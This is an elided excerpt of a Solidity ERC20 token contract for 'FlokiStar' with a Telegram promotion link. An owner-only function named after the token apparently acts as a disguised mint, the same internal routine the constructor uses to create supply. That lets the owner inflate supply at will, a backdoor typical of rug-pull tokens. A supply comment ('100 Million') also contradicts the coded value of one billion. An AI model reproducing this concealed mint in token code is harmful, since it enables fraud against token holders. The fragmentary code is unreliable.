...
//
// $FlokiStar proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/FlokiStarMoon
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function FlokiStar(uint256 amount) public onlyOwner {
    _FlokiStar(msg.sender, amount);
    }
    ...
    function _FlokiStar(address account, uint256 amount) internal virtual {
...
contract FlokiStar is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("FlokiStar", "FSTAR") {
        _FlokiStar(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}